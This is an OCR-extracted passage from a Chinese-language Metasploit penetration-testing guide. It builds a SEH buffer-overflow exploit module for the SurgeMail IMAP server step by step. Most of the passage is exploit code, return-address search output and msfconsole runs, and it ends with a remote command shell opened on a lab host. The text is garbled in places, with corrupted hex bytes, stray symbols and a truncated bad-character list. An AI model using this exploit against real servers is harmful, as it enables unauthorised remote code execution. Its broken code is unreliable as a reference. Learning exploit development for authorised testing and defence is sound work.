1
'DisclosureDate′ =>'March 13 2008',
'DefaultTarget'=> 0))
end
def exploit
③connected=connect_login
lead = "\x41" * 10360
evil=lead+"\x43"*4
print_status("Sending payload")
sploit=‘00o2 LIST（)"/′+ evil+"""pWNED"'+"\r\n"
Osock.put(sploit)
handler
disconnect
end
end
声明的‘Space”
①是指能够为shellcode所提供的内存空间大小。这个声明在渗透攻击模
块中是非常重要的，因为它决定了在Metasploit中哪些攻击载荷能被用于这个渗透攻击模块。
一些攻击载荷可能比其他的需要更多一些的内存空间，因此请不要过高的估计这个值。攻击载
荷的大小相差很大，而且编码会再次扩大它们的长度，如果你需要查看一个未经编码的攻击载
荷的大小，可以使用info 命令跟上攻击载荷的名称，如下所示，你可以从Total size值中得到攻
击载荷的大小。
msf>info payload/windows/shell_bind_tcp
Name:WindowsCommandShell，Bind TCPInline
Module: payload/windows/shell_bind_tcp
Version:8642
205
---
## Page 233
Metasploit渗透测试指南
Platform:Windows
Arch:x86
Needs Admin:No
Total size: 341
Rank:Normal
在Targets节中的return_address?现在填充的还是一个占位符，我们将在后面的渗透代码开
发过程中进行修改。
如同在Fuzz测试器模块中讨论的一样，这个渗透代码首先需要连接和登录到远程目标服务
上③，使用一长串字符A来作为初始缓冲区O，然后添加4个字符C来覆盖SEH，生成整个
渗透注入字符串6，最后发送给目标系统·。
14.4获取返回地址
下一步就是在surgemail.exe中定位一个POP-POP-RETN指令序列，你可以将这个二进制程
序复制到你的Back/Track攻击机上，然后使用msfpescan功能例程的-p选项来从程序中找出一
个合适的候选地址，如下所示：
root@bt:/tmp# msfpescan -p surgemail.exe
[surgemail.exe]
0x0042e947 pop esi; pop ebp; ret
0x0042f88b pop esi;pop ebp;ret
0x00458e68 pop esi;pop ebp;ret
0x00458edb pop esi; pop ebp; ret
0x0046754dpopesi;popebp;ret
0x00467578 pop esi; pop ebp; ret
0x0046d204 pop eax; pop ebp; ret
...SNIP..·
0x0078506epopebx;popebp;ret
0x00785105 pop ecx; pop ebx; ret
0x0078517e pop esi; pop ebx; ret
当你使用msfpescan来对目标二进制文件进行搜索时，它将读取机器指令并搜索哪些符合
目标指令模式（这个案例中是POP-POP-RETN）的指令地址，从结果中你可以看到，它找到了
多个不同的地址。我们使用其中的任意一个地址，比如最后的0x0078517e，用来在渗透代码中
覆SEH。确定选择之后，我们对渗透攻击模块代码中的‘Target’节进行修改来包含这个返回
地址，并在exploit节中将其填写入构造的缓冲区中，如下所示：
206
---
## Page 234
第14章创建你自己的渗透攻击模块
'Platform
‘uTM，（=
'Targets'
=>
]，
'DisclosureDate′=>'March 13 2008'，
'DefaultTarget′ => o))
end
def exploit
connected = connect_login
lead="\x41"*10360
Oevil = lead + [target.ret].pack("A3")
print_status("Sendingpayload")
sploit =‘ooO2 LIST （)"/′+ evil +‘""pWNED"’+"\r\n"
为了对SEH进行三个字节的覆盖，我们将添加入‘Target”区中的缓冲区·设置为以低字
节序表示的返回地址，如代码中黑体字显示的那样。（字节序是由目标系统CPU体系结构的类
型所决定的，Intel兼容的CPU处理器是使用低字节序的）。
声明的返回地址精确地发送到目标系统上。当你编写或修改使用三个字节覆盖值地渗透代码时，
你需要精确地声明目标地址（这个案例中是0x0078517e），而Metasploit将会在你使用
[target.ret].pack(V"时自动地对字节进行正确排序。在这个场景中，需要更细粒度的控制，因为
我们将发出一个空字符，它可能被解析为字符串的结尾，而使得渗透攻击代码无法正常工作。
现在是很好的时机来运行测试渗透攻击模块、来确认它是否正常工作了。如果你在开发渗
透代码时一直埋头写代码而中间没有进行测试，那你往往可能在某些地方留下错误，然后在最
后调试时需要投入大量时间才能找出哪里出错。如下运行渗透攻击模块：
msf>use exploit/windows/imap/surgemail_book
msf exploit(surgemail_book)> set IMAPPASS test
IMAPPASS => test
msf exploit(surgemail_book)>Set IMAPUSER test
IMAPUSER => test
msf exploit(surgemail_book)>setRH0ST 192.168.1.155
RHOST=> 192.168.1.155
0 msf exploit(surgemail_book)> Set PAYLoAD generic/debug_trap
PAYLOAD => generic/debug_trap
msf exploit(surgemail_book)>exploit
[*]Authenticating as test with password test...
[*]Sending payload
[*] Exploit completed, but no session was created.
msfexploit(surgemail_book)>
207
---
## Page 235
Metasploit渗透测试指南
我们使用的攻击载荷是generic/debug_trap?，这并不是一个真正的攻击载荷，而是发送大
量的xCC（中断指令），来进行渗透攻击指令执行流程的动态调试，这对于确定你在渗透攻击
过程中shellcode是否能被插入到正确位置上是非常有用的。
在运行渗透攻击代码后，打开ImmunityDebugger，如图14-5所示，在断点上选择View->
SEHChain菜单项，按下F2键设置一个断点，然后按SHIFT-F9组合键将异常传递给应用程
序并进入到POP-POP-RETN指令序列。
接着，继续在调试器中，按F7键进行单步指令调试，指导你最终进入在NSEH中包含的
41414141指令。
s
Do3aHx1llNuHll-IemtwhcPkbzIos?
POPET
PUSH
PUSH
COF
OFF
POU
138200
EVTE PTRDS:[EA+12CDC41]
DORD PTR DS:[12CDE28]
L
116:44:08B
图14-5进入POP-POP-RETN指令序列
现在，编辑渗透测试模块来包含用来进行向后的短跳转的指令，如下所示：
def exploit
connected = connect_login
0lead="\x41"*10356
nseh="\xeb\xfg\x90\x90"
evil=lead +nseh+[target.ret].pack("A3")
print_status("Sending payload")
sploit =‘oo02 LIST （)"/′+ evil+"""PWNED"’+"\r\n"
sock.put(sploit)
handler
disconnect
end
208
---
## Page 236
第14章创建你自己的渗透攻击模块
在你编写你的渗透代码时，一定要记得调整初始缓冲区长度◎，否则返回地址的位置将错
位了。在这个案例中，NSEH会被覆盖成一个向后五个字节的短跳转指令（\ixeblxf9ix90\x90）
②，其中eb时短跳转的操作码。新的初始缓冲区长度被调整为10356字节，因为我们在SEH
覆盖返回地址之前加入了4个新的字节。
当你重新运行渗透代码并在调试器里跟踪指令时，你将进入到在异常处理地址之前的一堆
41（十六进制的A）中，而四个INCECX指令应该已经被短跳转指令所替代，使得程序执行流
程将跳转到初始缓冲区中。
现在我们修改渗透代码，以包含一个近跳转指令序列（(xe9xddxd7\xffxff)，从而向后跳
转到初始缓冲区的开始位置，看如图14-6所示的缓冲区布局，我们可以看到整个A字符构成的
缓冲区都是完整连续的，这为我们的shellcode提供了超过10.000字节的空间。由于可用的
shellcode平均所需的空间只需要不到500个字节，这么巨大的空间足够让你填入几乎所有类型
的shellcode。
FileVlewDebugPluginsImmLibOptionsWindowHelpJobs
-司×
ReLSterFPU
9780240
978C9F4
图14-6为shellcode提供的大量内存空间
现在你所要做的全部事情就是将由\x41组成的缓冲区替换成一个NOP（\x90）空指令滑行
区，能够跳入执行，然后后面的shellcode就可以完全交给Metasploit来搞定了。
defexploit
connected = connect_login
0lead = "\x90" *(10351 - payload.encoded.length)
near="\xe9\xdd\xd7\xff\xff"
nseh="\xeb\xf9\x90\x90"
209
---
## Page 237
Metasploit渗透测试指南
③evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
print_status("Sendingpayload")
sock.put(sploit)
handler
disconnect
end
在上面的代码中，你可以看到先前我们使用的由一长串字符A的初始缓冲区已经替换成了
NOP空指令和由Metasploit所生成的shellcode①。注意缓冲区长度从先前的10,356字节降到了
10,351字节，以容纳近跳转指令②。最后，使用所有渗透攻击所需的元素③来构造出最终的“邪
恶”字符串。
现在我们可以选择一个真正的攻击载荷，然后执行这个渗透攻击模块，来看看发生了什么。
奇怪的是，渗透攻击过程结束后却没有创建出交互会话。渗透攻击模块已经连接服务器并发出
了攻击载荷，但却没有让我们得到shell，结果如下所示：
msf exploit(surgemail_book) > set payload windows/shell_bind_tcp
payload => windows/shell_bind_tcp
msf exploit(surgemail_book) > exploit
[*]Started bind handler
[*]Authenticatingas test with password test...
[*]Sendingpayload
[*]Exploit completed,but no session was created.
msf exploit(surgemail_book)>
14.5坏字符和远程代码执行
好了，我们遭遇到了一个没有预期到的结果：渗透测试过程结束了，却没有创建出交互会
欢迎来到有些时候非常具有挑战性，但总是很令人崩溃的“坏字符世界”。一些字符，在作为“邪
恶”的攻击缓冲区中的组成部分被发送到目标程序后，会在被程序读取时搞砸整个攻击。不幸
的结果通常是这些坏字符会让你的shellcode被截断掉，从而让整个渗透攻击失败。
因此，当你编写-一个Metasploit渗透攻击模块时，你必须要确认出所有可能的坏字符，因
为Metasploit在进行每次渗透攻击时所生成的shellcode会有差异，而任何漏网的坏字符将会大
大降低渗透攻击模块的可靠性。在多数情况下，如果你未能找出所有的坏字符，目标应用程序
将在没有执行shellcode的情况下就崩溃。但是在前面的例子中，SurgeMail甚至没有崩溃，渗
透攻击看起来是成功的，但我们却没有得到交互会话。
识别坏字符有多种方法，包括将动态产生的shellcode替换为一个由连续字符（如x0o\
x01\x02.）所组成的字符串，然后利用调试器来看最先被截断的字符，并将其标识为坏字符。
210
---
## Page 238
第14章创建你自己的渗透攻击模块
然而，最快的方法就是从类似的渗透代码中来找坏字符。举例来说，搜索IMAP协议的一些渗
透代码，发现lx00\x09\x0alx0blx0clx0d\x20\x2clx3alx40lx7b都被列为了坏字符，如下所示。
'Privileged`
=>false,
'DefaultOptions'
=>
“EXITFUNC'=>'thread'，
'Payload'
=>
{
'Space'
=>10351,
'DisableNops' => true,
'BadChars
'Platform'
=>'win',
'Targets'
=>
当你在渗透攻击模块中声明'BadChars'后，Metasploit将自动地将它们排除在Shellcode以及
所有动态生成的字符串和空指令串之外。
在我们声明坏字符之后，再次运行渗透攻击模块，如下所示，我们在第三次尝试中最终获
取到了一个交互会话。这个渗透攻击模块仍然不是很可靠，虽然它现在已经是可以工作的，这
是因为Metasploit每次执行渗透攻击时都动态生成Shellcode，而导致模块运行失败的一些残留
的坏字符并不会总是出现。
msf exploit(surgemail_book)>rexploit
[*]Started bind handler
[*] Authenticating as test with password test...
[*]Sending payload
[*] Exploit completed,but no session was created.
msf exploit(surgemail_book)>rexploit
[*]Started bind handler
[*]Authenticating as test with password test...
[*]Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) > rexploit
[*]Started bind handler
[*] Authenticating as test with password test...
[*]Sending payload
[*] Command shell session 1 opened (192.168.1.101:59501 -> 192.168.1.155:4444)
(C) Copyright 1985-2001 Microsoft Corp.
c:\surgemail>
211
---
## Page 239